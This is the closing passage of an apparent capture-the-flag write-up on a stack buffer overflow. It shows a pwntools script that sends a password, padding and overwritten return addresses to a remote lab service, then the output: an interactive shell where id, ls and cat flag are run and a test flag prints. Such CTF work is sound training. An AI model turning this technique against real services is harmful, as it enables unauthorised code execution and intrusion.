    RET = p64(0x401016)
    RIP = p64(0x401254)
    
    payload=[
        b"sUp3r_S3cr3T_P4s5w0rD\x00",
        padding,
        RET,
        RIP
        
    ]
    
    payload=b"".join(payload)

    # setup connections
    p=remote("192.168.0.22",1024)
    print(p.recvline())
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()

```

```bash
┌[root☮2d6562dcd579]-(/pwd)
└> python3 asd.py
[+] Opening connection to 192.168.0.22 on port 1024: Done
b'Enter password to get system details:
'
[*] Switching to interactive mode

Access Granted

top - 18:54:12 up  3:20,  0 users,  load average: 0.01, 0.06, 0.08
Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  1.7 sy,  0.0 ni, 98.3 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   1987.5 total,    924.1 free,    356.9 used,    706.5 buff/cache
MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1475.9 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 ctf       20   0    2600    840    776 S   0.0   0.0   0:00.04 sh
    7 ctf       20   0    2352    812    748 S   0.0   0.0   0:00.00 ynetd
   70 ctf       20   0    2600    780    708 S   0.0   0.0   0:00.00 sh
   71 ctf       20   0    2348   1436   1356 S   0.0   0.1   0:00.00 system_he+
   72 ctf       20   0    2600    792    724 S   0.0   0.0   0:00.00 sh
   73 ctf       20   0    5912   2904   2612 R   0.0   0.1   0:00.00 top
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag
system_health_check
ynetd
$ cat flag
LO{THIS_IS_TEST_FLAG}$
```


## Reference Links



- https://www.youtube.com/watch?v=OqTpc_ljPYk
- https://ctf101.org/binary-exploitation/relocation-read-only/
- https://www.felixcloutier.com/x86/ret
- http://blog.binpang.me/2019/07/12/stack-alignment/
- https://pwndumb.github.io/posts/Docker-101-MacOS/
